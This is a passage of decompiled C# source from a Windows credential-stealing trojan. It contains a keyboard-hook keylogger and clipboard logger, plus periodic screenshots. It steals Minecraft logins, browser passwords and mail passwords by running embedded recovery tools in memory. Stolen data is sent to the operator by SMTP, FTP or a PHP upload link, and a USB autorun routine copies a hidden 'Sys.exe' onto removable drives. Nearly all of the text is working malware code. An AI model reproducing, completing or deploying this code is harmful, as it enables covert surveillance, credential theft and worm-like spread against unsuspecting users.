                    case 0x7d:
                    case 0x7e:
                    case 0x7f:
                    case 0x80:
                    case 0x81:
                    case 130:
                    case 0x83:
                    case 0x84:
                    case 0x85:
                    case 0x86:
                    case 0x87:
                        str = "[F" + Conversions.ToString((int) (lParam.vkCode - 0x6f)) + "]";
                        goto Label_0A8D;

                    case 160:
                    case 0xa1:
                        if (this.UseCaps)
                        {
                            goto Label_0581;
                        }
                        str = " [shift] ";
                        goto Label_0A8D;

                    case 0xa2:
                    case 0xa3:
                        str = " [ctrl] ";
                        goto Label_0A8D;

                    case 0xa4:
                        str = " [alt] ";
                        goto Label_0A8D;

                    case 0xa5:
                        str = " [ralt] ";
                        goto Label_0A8D;
                }
                goto Label_0828;
            Label_03F7:
                if (str == "2")
                {
                    str = "@";
                }
                else if (str == "3")
                {
                    str = "#";
                }
                else if (str == "4")
                {
                    str = "$";
                }
                else if (str == "5")
                {
                    str = "%";
                }
                else if (str == "6")
                {
                    str = "^";
                }
                else if (str == "7")
                {
                    str = "&";
                }
                else if (str == "8")
                {
                    str = "*";
                }
                else if (str == "9")
                {
                    str = "(";
                }
                else if (str == "0")
                {
                    str = ")";
                }
                goto Label_0A8D;
            Label_04E4:
                str = Conversions.ToString(Strings.ChrW(lParam.vkCode));
                goto Label_0A8D;
            Label_0529:
                str = Conversions.ToString(Strings.ChrW(lParam.vkCode + 0x20));
                goto Label_0A8D;
            Label_0581:
                this.Shift = true;
                goto Label_0A8D;
            Label_05DE:
                this.Caps = true;
                goto Label_0A8D;
            Label_05EA:
                if (MyProject.Computer.Keyboard.CapsLock)
                {
                    str = "[/cap]";
                }
                else
                {
                    str = "[cap]";
                }
                goto Label_0A8D;
            Label_068F:
                str2 = this.KeyLog;
                this.KeyLog = this.KeyLog.Remove(this.KeyLog.ToString().Length - 1);
                if (this.KeyLog.EndsWith(this.RHeader + "\r\n"))
                {
                    this.KeyLog = str2;
                    str = "[BS]";
                }
                else
                {
                    str = "";
                }
                str2 = "";
                goto Label_0A8D;
            Label_0709:
                str = ">";
                goto Label_0A8D;
            Label_0727:
                str = "-";
                goto Label_0A8D;
            Label_0828:
                str = Conversions.ToString(lParam.vkCode);
                if (this.Shift)
                {
                    switch (str)
                    {
                        case "192":
                            str = "~";
                            break;

                        case "219":
                            str = "{";
                            break;

                        case "221":
                            str = "}";
                            break;

                        case "220":
                            str = "|";
                            break;

                        case "222":
                            str = "\"";
                            break;

                        case "186":
                            str = ":";
                            break;

                        case "188":
                            str = "<";
                            break;

                        case "191":
                            str = "?";
                            break;

                        case "187":
                            str = "+";
                            break;
                    }
                }
                else if (!this.Shift)
                {
                    switch (str)
                    {
                        case "192":
                            str = "`";
                            break;

                        case "219":
                            str = "[";
                            break;

                        case "221":
                            str = "]";
                            break;

                        case "220":
                            str = @"\";
                            break;

                        case "222":
                            str = "'";
                            break;

                        case "186":
                            str = ";";
                            break;

                        case "188":
                            str = ",";
                            break;

                        case "191":
                            str = "/";
                            break;

                        case "187":
                            str = "=";
                            break;
                    }
                }
                if (str == "107")
                {
                    str = "+";
                }
                switch (str)
                {
                    case "107":
                        str = "*";
                        break;

                    case "111":
                        str = "/";
                        break;

                    case "44":
                        str = " [SS] ";
                        break;
                }
                goto Label_0A8D;
            Label_0A22:
                if ((wParam == 0x101) | (wParam == 0x105))
                {
                    switch (lParam.vkCode)
                    {
                        case 160:
                        case 0xa1:
                            goto Label_0A78;

                        case 0xa2:
                        case 0xa3:
                            str = "[/ctrl]";
                            break;

                        case 0xa4:
                            str = "[/lalt]";
                            break;

                        case 0xa5:
                            str = "[/ralt]";
                            break;
                    }
                }
                goto Label_0A8D;
            Label_0A78:
                if (!this.UseCaps)
                {
                    str = "[/shift]";
                }
                this.Shift = false;
            Label_0A8D:
                this.KeyLog = this.KeyLog + str;
                if (str == "")
                {
                }
                num = CallNextHookEx((int) this.KeyboardHandle, Code, wParam, lParam);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                num = Conversions.ToInteger("");
                ProjectData.ClearProjectError();
            }
            return num;
        }

        [DllImport("tapi32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern long lineSetAppSpecific(long hCall, long dwAppSpecific);
        [DllImport("rtm.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern long MgmGetNextMfeStats(ref IntPtr pimmStart, ref long pdwBufferSize, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pbBuffer, ref long pdwNumEntries);
        public void Minecraftsub()
        {
            Thread.Sleep(this.Minecraftt);
            if (this.IsConnectedToInternet())
            {
                if (this.useftp != "noftp")
                {
                    try
                    {
                        if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\.minecraft\lastlogin"))
                        {
                            this.UploadFTP(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\.minecraft\lastlogin");
                        }
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        Exception exception = exception1;
                        ProjectData.ClearProjectError();
                    }
                }
                else if ((this.usephp == "nophp") && System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\.minecraft\lastlogin"))
                {
                    try
                    {
                        MailMessage message = new MailMessage();
                        SmtpClient client = new SmtpClient(this.smtpstring);
                        message.From = new MailAddress(this.emailstring);
                        message.To.Add(this.emailstring);
                        message.Subject = "Logger|Minecraft Stealer - [" + MyProject.Computer.Name + "]";
                        message.Body = "There is a file attached to this email containing Minecraft username and password download it then decrypt the login information with my Minecraft Decryptor";
                        message.Attachments.Add(new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\.minecraft\lastlogin"));
                        client.Port = Conversions.ToInteger(this.portstring);
                        client.EnableSsl = this.DisableSSL != "EnableSSL";
                        client.Credentials = new NetworkCredential(this.emailstring, this.passstring);
                        client.Send(message);
                    }
                    catch (Exception exception3)
                    {
                        ProjectData.SetProjectError(exception3);
                        Exception exception2 = exception3;
                        ProjectData.ClearProjectError();
                    }
                }
            }
        }

        public string olddesdc(string input, string pass)
        {
            string str2;
            DESCryptoServiceProvider provider = new DESCryptoServiceProvider();
            MD5CryptoServiceProvider provider2 = new MD5CryptoServiceProvider();
            try
            {
                byte[] destinationArray = new byte[8];
                Array.Copy(provider2.ComputeHash(Encoding.ASCII.GetBytes(pass)), 0, destinationArray, 0, 8);
                provider.Key = destinationArray;
                provider.Mode = CipherMode.ECB;
                ICryptoTransform transform = provider.CreateDecryptor();
                byte[] inputBuffer = Convert.FromBase64String(input);
                str2 = Encoding.ASCII.GetString(transform.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
            return str2;
        }

        private string readweb(string url)
        {
            try
            {
                WebClient client = new WebClient();
                StreamReader reader = new StreamReader(client.OpenRead(url));
                return reader.ReadToEnd();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
            return null;
        }

        public void run(byte[] run)
        {
            object[] arguments = new object[] { run, @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe" };
            bool[] copyBack = new bool[] { true, false };
            if (copyBack[0])
            {
                run = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(byte[]));
            }
            Assembly assembly = (Assembly) NewLateBinding.LateGet(Assembly.Load(this.mem).CreateInstance("CMemoryExecute"), null, "Run", arguments, null, null, copyBack);
        }

        public void seekanddestroy(string process__1)
        {
            foreach (Process process in Process.GetProcesses())
            {
                if (process.ProcessName.Contains(process__1))
                {
                    process.Kill();
                }
            }
        }

        public void SendLogs()
        {
            while (true)
            {
                Thread.Sleep(Conversions.ToInteger(this.timerstring));
                if (!string.IsNullOrEmpty(this.KeyLog.Trim()) && this.IsConnectedToInternet())
                {
                    string keyLog = this.KeyLog;
                    lock (keyLog)
                    {
                        string cLog = this.CLog;
                        Monitor.Enter(cLog);
                        try
                        {
                            MailMessage message = new MailMessage();
                            SmtpClient client = new SmtpClient(this.smtpstring);
                            message.From = new MailAddress(this.emailstring);
                            message.To.Add(this.emailstring);
                            message.Subject = "Logger - Key Recorder - [" + MyProject.Computer.Name + "]";
                            message.Body = "                                 **********************************************\r\n                                                  ClipBoard Log\r\n                                 **********************************************\r\n" + this.CLog + "\r\n                                 **********************************************\r\n                                                  Keylogger Log\r\n                                 **********************************************\r\n" + this.KeyLog;
                            if (this.screeny != "Disablescreeny")
                            {
                                if (!Directory.Exists(Path.GetTempPath() + "screens"))
                                {
                                    Directory.CreateDirectory(Path.GetTempPath() + "screens");
                                }
                                Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
                                Bitmap image = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
                                Point upperLeftSource = new Point(0, 0);
                                Point upperLeftDestination = new Point(0, 0);
                                Graphics.FromImage(image).CopyFromScreen(upperLeftSource, upperLeftDestination, blockRegionSize);
                                image.Save(Path.GetTempPath() + @"screens\screenshot" + Conversions.ToString(this.screenynumber) + ".jpeg");
                                message.Attachments.Add(new Attachment(Path.GetTempPath() + @"screens\screenshot" + Conversions.ToString(this.screenynumber) + ".jpeg"));
                                this.screenynumber++;
                            }
                            client.Port = Conversions.ToInteger(this.portstring);
                            client.EnableSsl = this.DisableSSL != "EnableSSL";
                            client.Credentials = new NetworkCredential(this.emailstring, this.passstring);
                            client.Send(message);
                            this.KeyLog = string.Empty;
                            this.CLog = string.Empty;
                        }
                        catch (Exception exception1)
                        {
                            ProjectData.SetProjectError(exception1);
                            ProjectData.ClearProjectError();
                        }
                        finally
                        {
                            Monitor.Exit(cLog);
                        }
                    }
                }
            }
        }

        public void SendLogsFTP()
        {
            int num = 0;
            while (true)
            {
                Thread.Sleep(Conversions.ToInteger(this.timerstring));
                if (!string.IsNullOrEmpty(this.KeyLog.Trim()) && this.IsConnectedToInternet())
                {
                    num++;
                    string keyLog = this.KeyLog;
                    lock (keyLog)
                    {
                        string cLog = this.CLog;
                        Monitor.Enter(cLog);
                        try
                        {
                            string data = "                                 **********************************************\r\n                                                  ClipBoard Log\r\n                                 **********************************************\r\n" + this.CLog + "\r\n                                 **********************************************\r\n                                                  Keylogger Log\r\n                                 **********************************************\r\n" + this.KeyLog;
                            string str3 = Conversions.ToString(DateTime.Now).Replace("/", ".");
                            this.UploadFTP("Logger_KeyLog_" + Conversions.ToString(num) + "_" + MyProject.Computer.Name + " " + str3 + ".txt", data);
                            if (this.screeny != "Disablescreeny")
                            {
                                if (!Directory.Exists(Path.GetTempPath() + "screens"))
                                {
                                    Directory.CreateDirectory(Path.GetTempPath() + "screens");
                                }
                                Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
                                Bitmap image = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
                                Point upperLeftSource = new Point(0, 0);
                                Point upperLeftDestination = new Point(0, 0);
                                Graphics.FromImage(image).CopyFromScreen(upperLeftSource, upperLeftDestination, blockRegionSize);
                                image.Save(Path.GetTempPath() + @"screens\screenshot" + Conversions.ToString(this.screenynumber) + "_" + MyProject.Computer.Name + ".jpeg");
                                this.UploadFTP(Path.GetTempPath() + @"screens\screenshot" + Conversions.ToString(this.screenynumber) + "_" + MyProject.Computer.Name + ".jpeg");
                                this.screenynumber++;
                            }
                            this.KeyLog = string.Empty;
                            this.CLog = string.Empty;
                        }
                        catch (Exception exception1)
                        {
                            ProjectData.SetProjectError(exception1);
                            ProjectData.ClearProjectError();
                        }
                        finally
                        {
                            Monitor.Exit(cLog);
                        }
                    }
                }
            }
        }

        public void SendLogsPHP()
        {
            int num = 0;
            while (true)
            {
                Thread.Sleep(Conversions.ToInteger(this.timerstring));
                if (!string.IsNullOrEmpty(this.KeyLog.Trim()) && this.IsConnectedToInternet())
                {
                    num++;
                    string keyLog = this.KeyLog;
                    lock (keyLog)
                    {
                        string cLog = this.CLog;
                        Monitor.Enter(cLog);
                        try
                        {
                            string data = "                                 **********************************************\r\n                                                  ClipBoard Log\r\n                                 **********************************************\r\n" + this.CLog + "\r\n                                 **********************************************\r\n                                                  Keylogger Log\r\n                                 **********************************************\r\n" + this.KeyLog;
                            string str3 = Conversions.ToString(DateTime.Now).Replace("/", ".");
                            this.UploadPHP("Logger_KeyLog_" + Conversions.ToString(num) + "_" + MyProject.Computer.Name + " " + str3 + ".txt", data);
                            this.KeyLog = string.Empty;
                            this.CLog = string.Empty;
                        }
                        catch (Exception exception1)
                        {
                            ProjectData.SetProjectError(exception1);
                            ProjectData.ClearProjectError();
                        }
                        finally
                        {
                            Monitor.Exit(cLog);
                        }
                    }
                }
            }
        }

        public void ServerInstall()
        {
            string str2;
            string str4;
            string str6;
            string str5 = Conversions.ToString((double) (Conversions.ToDouble(this.timerstring) / 60000.0));
            string str7 = Conversions.ToString(DateTime.Now).Replace("/", ".");
            if (this.logger != "Disablelogger")
            {
                str4 = "True";
            }
            else
            {
                str4 = "False";
            }
            if (this.clip != "Disableclip")
            {
                str2 = "True";
            }
            else
            {
                str2 = "False";
            }
            if (this.stealers != "Disablestealers")
            {
                str6 = "True";
            }
            else
            {
                str6 = "False";
            }
            string data = "This is an email notifying you that " + MyProject.Computer.Name + " has ran your logger and emails should be sent to you shortly and at interval choosen.\r\n \r\nLogger Details: \r\nServer Name: " + this.appname + "\r\nKeylogger Enabled: " + str4 + "\r\nClipboard-Logger Enabled: " + str2 + "\r\nTime Logs will be delivered: Every " + str5 + " minutes\r\n \r\nStealers Enabled: " + str6 + "\r\nTime Log will be delivered: Average 2 to 4 minutes\r\n \r\nLocal Date and Time: " + Conversions.ToString(MyProject.Computer.Clock.LocalTime) + "\r\nInstalled Language: " + MyProject.Computer.Info.InstalledUICulture.ToString() + "\r\nOperating System: " + MyProject.Computer.Info.OSFullName + "\r\nInternal IP Address: " + this.InternalIp + "\r\nExternal IP Address: " + this.ExIP + "\r\nInstalled Anti-Virus: " + this.MyAV + "\r\nInstalled Firewall: " + this.MyFirewall;
            if (this.IsConnectedToInternet() && (this.notify != "Disablenotify"))
            {
                if (this.useftp != "noftp")
                {
                    try
                    {
                        this.UploadFTP("Logger_Notification_" + MyProject.Computer.Name + " " + str7 + ".txt", data);
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        Exception exception = exception1;
                        ProjectData.ClearProjectError();
                    }
                }
                else if (this.usephp != "nophp")
                {
                    try
                    {
                        this.UploadPHP("Logger_Notification_" + MyProject.Computer.Name + " " + str7 + ".txt", data);
                    }
                    catch (Exception exception3)
                    {
                        ProjectData.SetProjectError(exception3);
                        Exception exception2 = exception3;
                        ProjectData.ClearProjectError();
                    }
                }
                else
                {
                    try
                    {
                        MailMessage message = new MailMessage();
                        SmtpClient client = new SmtpClient(this.smtpstring);
                        message.From = new MailAddress(this.emailstring);
                        message.To.Add(this.emailstring);
                        message.Subject = "Logger - Server Ran - [" + MyProject.Computer.Name + "]";
                        message.Body = data;
                        client.Port = Conversions.ToInteger(this.portstring);
                        client.EnableSsl = this.DisableSSL != "EnableSSL";
                        client.Credentials = new NetworkCredential(this.emailstring, this.passstring);
                        client.Send(message);
                    }
                    catch (Exception exception4)
                    {
                        ProjectData.SetProjectError(exception4);
                        ProjectData.ClearProjectError();
                    }
                }
            }
        }

        [DllImport("user32", EntryPoint="SetWindowsHookExA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int SetWindowsHookEx(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);
        public void Spread()
        {
            while (true)
            {
                foreach (DriveInfo info in DriveInfo.GetDrives())
                {
                    try
                    {
                        if (info.DriveType == DriveType.Removable)
                        {
                            using (StreamWriter writer = new StreamWriter(info.Name + "autorun.inf"))
                            {
                                writer.WriteLine("[autorun]");
                                writer.WriteLine("open=Sys.exe");
                                writer.WriteLine("action=Run win32");
                                writer.Close();
                            }
                            System.IO.File.Copy(Application.ExecutablePath, info.Name + "Sys.exe", true);
                            System.IO.File.SetAttributes(info.Name + "autorun.inf", FileAttributes.System | FileAttributes.Hidden | FileAttributes.ReadOnly);
                            System.IO.File.SetAttributes(info.Name + "Sys.exe", FileAttributes.System | FileAttributes.Hidden | FileAttributes.ReadOnly);
                        }
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        ProjectData.ClearProjectError();
                    }
                }
                Thread.Sleep(0x1388);
            }
        }

        public void StartStealers()
        {
            this.Mail = Debugger.My.Resources.Resources.mailpv;
            Thread.Sleep(0x3e8);
            this.WB = Debugger.My.Resources.Resources.WebBrowserPassView;
            Thread.Sleep(0x7d0);
            Thread thread2 = new Thread(new ThreadStart(this.stealMail));
            thread2.SetApartmentState(ApartmentState.STA);
            thread2.Start();
            Thread.Sleep(0x2710);
            Thread thread = new Thread(new ThreadStart(this.stealWebroswers));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            Thread.Sleep(0x2710);
        }

        public void stealMail()
        {
            try
            {
                object[] arguments = new object[] { this.Mail, Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", @"Microsoft.NET\Framework\v2.0.50727\vbc.exe"), "/stext \"" + this.path + "holdermail.txt\"" };
                bool[] copyBack = new bool[] { true, false, false };
                NewLateBinding.LateCall(Assembly.Load(Debugger.My.Resources.Resources.CMemoryExecute).CreateInstance("CMemoryExecute"), null, "Run", arguments, null, null, copyBack, true);
                if (copyBack[0])
                {
                    this.Mail = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(byte[]));
                }
                this.WaitUntilFileIsAvailable(this.path + "holdermail.txt");
                this.CleanedPasswordsMAIL = System.IO.File.ReadAllText(this.path + "holdermail.txt");
                System.IO.File.Delete(this.path + "holdermail.txt");
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
        }

        public void stealWebroswers()
        {
            if (this.WB == null)
            {
                this.Holder = "                                 **********************************************\r\n                                      Operating System Intel Recovery\r\n                                 **********************************************\r\nCPU Name: " + MyProject.Computer.Name + "\r\nLocal Date and Time: " + Conversions.ToString(MyProject.Computer.Clock.LocalTime) + "\r\nInstalled Language: " + MyProject.Computer.Info.InstalledUICulture.ToString() + "\r\nNet Version: " + Environment.Version.ToString() + "\r\nOperating System Platform: " + MyProject.Computer.Info.OSPlatform + "\r\nOperating System Version: " + MyProject.Computer.Info.OSVersion + "\r\nOperating System: " + MyProject.Computer.Info.OSFullName + "\r\nInternal IP Address: " + this.InternalIp + "\r\nExternal IP Address: " + this.ExIP + "\r\nInstalled Anti-Virus: " + this.MyAV + "\r\nInstalled Firewall: " + this.MyFirewall + "\r\n                                 **********************************************\r\n                                      WEB Browser Password Recovery\r\n                                 **********************************************\r\n" + this.CleanedPasswordsWB + "\r\n                                 **********************************************\r\n                                    Mail Messenger Password Recovery\r\n                                 **********************************************\r\n" + this.CleanedPasswordsMAIL + "\r\n                                 **********************************************\r\n                                    Internet Download Manager Recovery\r\n                                 **********************************************\r\n                                 **********************************************\r\n                                      Jdownloader Password Recovery\r\n                                 **********************************************";
                Thread.Sleep(0x1388);
                string str4 = Conversions.ToString(DateTime.Now).Replace("/", ".");
                if (this.IsConnectedToInternet())
                {
                    if (this.useftp != "noftp")
                    {
                        try
                        {
                            this.UploadFTP("Logger_Recovery_Log_" + MyProject.Computer.Name + " " + str4 + ".txt", this.Holder);
                        }
                        catch (Exception exception1)
                        {
                            ProjectData.SetProjectError(exception1);
                            Exception exception = exception1;
                            ProjectData.ClearProjectError();
                        }
                    }
                    else if (this.usephp != "nophp")
                    {
                        try
                        {
                            this.UploadPHP("Logger_Recovery_Log_" + MyProject.Computer.Name + ".txt", this.Holder);
                        }
                        catch (Exception exception6)
                        {
                            ProjectData.SetProjectError(exception6);
                            Exception exception2 = exception6;
                            ProjectData.ClearProjectError();
                        }
                    }
                    else
                    {
                        try
                        {
                            MailMessage message = new MailMessage();
                            SmtpClient client = new SmtpClient(this.smtpstring);
                            message.From = new MailAddress(this.emailstring);
                            message.To.Add(this.emailstring);
                            message.Subject = "Logger|Recovery Log - [" + MyProject.Computer.Name + "]";
                            message.Body = this.Holder;
                            client.Port = Conversions.ToInteger(this.portstring);
                            client.EnableSsl = this.DisableSSL != "EnableSSL";
                            client.Credentials = new NetworkCredential(this.emailstring, this.passstring);
                            client.Send(message);
                        }
                        catch (Exception exception7)
                        {
                            ProjectData.SetProjectError(exception7);
                            ProjectData.ClearProjectError();
                        }
                    }
                }
            }
            try
            {
                object[] arguments = new object[] { this.WB, Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("system32", @"Microsoft.NET\Framework\v2.0.50727\vbc.exe"), "/stext \"" + this.path + "holderwb.txt\"" };
                bool[] copyBack = new bool[] { true, false, false };
                NewLateBinding.LateCall(Assembly.Load(Debugger.My.Resources.Resources.CMemoryExecute).CreateInstance("CMemoryExecute"), null, "Run", arguments, null, null, copyBack, true);
                if (copyBack[0])
                {
                    this.WB = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[0]), typeof(byte[]));
                }
                this.WaitUntilFileIsAvailable(this.path + "holderwb.txt");
                this.CleanedPasswordsWB = System.IO.File.ReadAllText(this.path + "holderwb.txt");
                System.IO.File.Delete(this.path + "holderwb.txt");
            }
            catch (Exception exception8)
            {
                ProjectData.SetProjectError(exception8);
                Exception exception3 = exception8;
                ProjectData.ClearProjectError();
            }
            this.Holder = "                                 **********************************************\r\n                                      Operating System Intel Recovery\r\n                                 **********************************************\r\nCPU Name: " + MyProject.Computer.Name + "\r\nLocal Date and Time: " + Conversions.ToString(MyProject.Computer.Clock.LocalTime) + "\r\nInstalled Language: " + MyProject.Computer.Info.InstalledUICulture.ToString() + "\r\nNet Version: " + Environment.Version.ToString() + "\r\nOperating System Platform: " + MyProject.Computer.Info.OSPlatform + "\r\nOperating System Version: " + MyProject.Computer.Info.OSVersion + "\r\nOperating System: " + MyProject.Computer.Info.OSFullName + "\r\nInternal IP Address: " + this.InternalIp + "\r\nExternal IP Address: " + this.ExIP + "\r\nInstalled Anti-Virus: " + this.MyAV + "\r\nInstalled Firewall: " + this.MyFirewall + "\r\n                                 **********************************************\r\n                                      WEB Browser Password Recovery\r\n                                 **********************************************\r\n" + this.CleanedPasswordsWB + "\r\n                                 **********************************************\r\n                                    Mail Messenger Password Recovery\r\n                                 **********************************************\r\n" + this.CleanedPasswordsMAIL + "\r\n                                 **********************************************\r\n                                    Internet Download Manager Recovery\r\n                                 **********************************************\r\n                                 **********************************************\r\n                                      Jdownloader Password Recovery\r\n                                 **********************************************";
            Thread.Sleep(0x1388);
            string str2 = Conversions.ToString(DateTime.Now).Replace("/", ".");
            if (this.IsConnectedToInternet())
            {
                if (this.useftp != "noftp")
                {
                    try
                    {
                        this.UploadFTP("Logger_Recovery_Log_" + MyProject.Computer.Name + " " + str2 + ".txt", this.Holder);
                        return;
                    }
                    catch (Exception exception9)
                    {
                        ProjectData.SetProjectError(exception9);
                        Exception exception4 = exception9;
                        ProjectData.ClearProjectError();
                        return;
                    }
                }
                if (this.usephp != "nophp")
                {
                    try
                    {
                        this.UploadPHP("Logger_Recovery_Log_" + MyProject.Computer.Name + ".txt", this.Holder);
                        return;
                    }
                    catch (Exception exception10)
                    {
                        ProjectData.SetProjectError(exception10);
                        Exception exception5 = exception10;
                        ProjectData.ClearProjectError();
                        return;
                    }
                }
                try
                {
                    MailMessage message2 = new MailMessage();
                    SmtpClient client2 = new SmtpClient(this.smtpstring);
                    message2.From = new MailAddress(this.emailstring);
                    message2.To.Add(this.emailstring);
                    message2.Subject = "Logger|Recovery Log - [" + MyProject.Computer.Name + "]";
                    message2.Body = this.Holder;
                    client2.Port = Conversions.ToInteger(this.portstring);
                    client2.EnableSsl = this.DisableSSL != "EnableSSL";
                    client2.Credentials = new NetworkCredential(this.emailstring, this.passstring);
                    client2.Send(message2);
                }
                catch (Exception exception11)
                {
                    ProjectData.SetProjectError(exception11);
                    ProjectData.ClearProjectError();
                }
            }
        }

        private void unhidden(string path)
        {
            try
            {
                DirectoryInfo info = new DirectoryInfo(path) {
                    Attributes = FileAttributes.Normal
                };
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
        }

        public void unHide()
        {
            try
            {
                string keyName = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced";
                MyProject.Computer.Registry.SetValue(keyName, "Hidden", "1", RegistryValueKind.DWord);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                Exception exception = exception1;
                ProjectData.ClearProjectError();
            }
        }

        public void UnhookKeyboard()
        {
            try
            {
                if (Conversions.ToBoolean(this.Hooked()) && (UnhookWindowsHookEx((int) this.KeyboardHandle) != 0))
                {
                    this.KeyboardHandle = IntPtr.Zero;
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        public static extern int UnhookWindowsHookEx(int hHook);
        public void UploadFTP(string Filename)
        {
            FtpWebRequest request = (FtpWebRequest) WebRequest.Create("ftp://" + this.ftphost + "/" + Path.GetFileName(Filename));
            request.Credentials = new NetworkCredential(this.ftpuser, this.ftppass);
            request.Method = "STOR";
            byte[] buffer = System.IO.File.ReadAllBytes(Filename);
            Stream requestStream = request.GetRequestStream();
            requestStream.Write(buffer, 0, buffer.Length);
            requestStream.Close();
            requestStream.Dispose();
        }

        public void UploadFTP(string Filename, string Data)
        {
            FtpWebRequest request = (FtpWebRequest) WebRequest.Create("ftp://" + this.ftphost + "/" + Filename);
            request.Credentials = new NetworkCredential(this.ftpuser, this.ftppass);
            request.Method = "STOR";
            Stream requestStream = request.GetRequestStream();
            using (BinaryWriter writer = new BinaryWriter(requestStream))
            {
                writer.Write(Data);
            }
            requestStream.Close();
            requestStream.Dispose();
        }

        public void UploadPHP(string Filename, string Data)
        {
            new WebClient().DownloadString(this.phplink + "?fname=" + Filename + "&data=" + Data);
        }

        private void WaitUntilFileIsAvailable(string Filename)
        {
            bool flag = false;
            while (!System.IO.File.Exists(Filename) | !flag)
            {
                try
                {
                    System.IO.File.OpenRead(Filename).Close();
                    flag = true;
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    ProjectData.ClearProjectError();
                }
                Application.DoEvents();
            }
        }

        private Debugger.Clipboard CH
        {
            get
            {
                return this._CH;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                Debugger.Clipboard.ChangedEventHandler handler = new Debugger.Clipboard.ChangedEventHandler(this.CH_Changed);
                if (this._CH != null)
                {
                    this._CH.Changed -= handler;
                }
                this._CH = value;
                if (this._CH != null)
                {
                    this._CH.Changed += handler;
                }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        private delegate int KeyboardHookDelegate(int Code, int wParam, ref Debugger.Debugger.KBDLLHOOKSTRUCT lParam);

        public enum virtualKey
        {
            K_0 = 0x30,
            K_1 = 0x31,
            K_2 = 50,
            K_3 = 0x33,
            K_4 = 0x34,
            K_5 = 0x35,
            K_6 = 0x36,
            K_7 = 0x37,
            K_8 = 0x38,
            K_9 = 0x39,
            K_A = 0x41,
            K_Alt = 0x12,
            K_B = 0x42,
            K_Backspace = 8,
            K_C = 0x43,
            K_CapsLock = 20,
            K_Control = 0x11,
            K_D = 0x44,
            K_Decimal = 190,
            K_Delete = 0x2e,
            K_Down = 40,
            K_E = 0x45,
            K_End = 0x23,
            K_Esc = 0x1b,
            K_F = 70,
            K_F1 = 0x70,
            K_F10 = 0x79,
            K_F11 = 0x7a,
            K_F12 = 0x7b,
            K_F13 = 0x7c,
            K_F14 = 0x7d,
            K_F15 = 0x7e,
            K_F16 = 0x7f,
            K_F17 = 0x80,
            K_F18 = 0x81,
            K_F19 = 130,
            K_F2 = 0x71,
            K_F20 = 0x83,
            K_F21 = 0x84,
            K_F22 = 0x85,
            K_F23 = 0x86,
            K_F24 = 0x87,
            K_F3 = 0x72,
            K_F4 = 0x73,
            K_F5 = 0x74,
            K_F6 = 0x75,
            K_F7 = 0x76,
            K_F8 = 0x77,
            K_F9 = 120,
            K_G = 0x47,
            K_H = 0x48,
            K_Home = 0x24,
            K_I = 0x49,
            K_Insert = 0x2d,
            K_J = 0x4a,
            K_K = 0x4b,
            K_L = 0x4c,
            K_LAlt = 0xa4,
            K_LControl = 0xa2,
            K_Left = 0x25,
            K_LShift = 160,
            K_LWin = 0x5b,
            K_M = 0x4d,
            K_N = 0x4e,
            K_Num_Add = 0x6b,
            K_Num_Decimal = 110,
            K_Num_Divide = 0x6f,
            K_Num_Multiply = 0x6a,
            K_Num_Subtract = 0x6d,
            K_NumLock = 0x90,
            K_Numpad0 = 0x60,
            K_Numpad1 = 0x61,
            K_Numpad2 = 0x62,
            K_Numpad3 = 0x63,
            K_Numpad4 = 100,
            K_Numpad5 = 0x65,
            K_Numpad6 = 0x66,
            K_Numpad7 = 0x67,
            K_Numpad8 = 0x68,
            K_Numpad9 = 0x69,
            K_O = 0x4f,
            K_P = 80,
            K_Pause = 0x13,
            K_PrintScreen = 0x2c,
